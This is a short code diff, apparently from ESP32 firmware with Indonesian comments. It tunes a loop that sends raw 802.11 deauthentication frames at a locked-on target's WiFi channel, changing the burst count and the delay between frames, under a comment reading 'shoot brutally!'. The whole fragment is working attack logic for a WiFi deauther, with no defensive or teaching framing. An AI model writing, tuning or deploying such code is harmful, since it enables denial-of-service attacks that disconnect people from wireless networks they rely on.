@@ -56,9 +56,9 @@ void loopWiFi(void * pvParameters) {
       esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
       
       // Tembak brutal!
-      for(int i=0; i<10; i++) {
+      for(int i=0; i<5; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-        vTaskDelay(2 / portTICK_PERIOD_MS); 
+        vTaskDelay(10 / portTICK_PERIOD_MS); 
       }
     }
     
